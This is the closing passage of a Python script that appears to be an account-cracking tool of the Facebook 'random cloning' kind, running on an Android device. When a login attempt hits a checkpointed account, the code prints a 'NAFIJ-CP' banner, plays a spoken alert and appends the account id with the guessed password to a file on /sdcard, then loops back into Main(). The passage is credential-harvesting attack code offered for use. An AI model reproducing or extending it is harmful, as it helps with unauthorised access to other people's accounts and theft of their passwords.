                iid = lo['error']['error_data']['uid']
                if iid in ok:pass
                if 'y' in cpx:
                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[𝗡𝗔𝗙𝗜𝗝-𝗖𝗣] {iid} | {psw}{W}''')
                    cp.append(id)
                    os.system('espeak -a 300 "Cp"')
                    open('/sdcard/rxrandomCP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                break
            else:pass
    lop += 1
#------------------[ END-CALL ]-----------------#
Main()
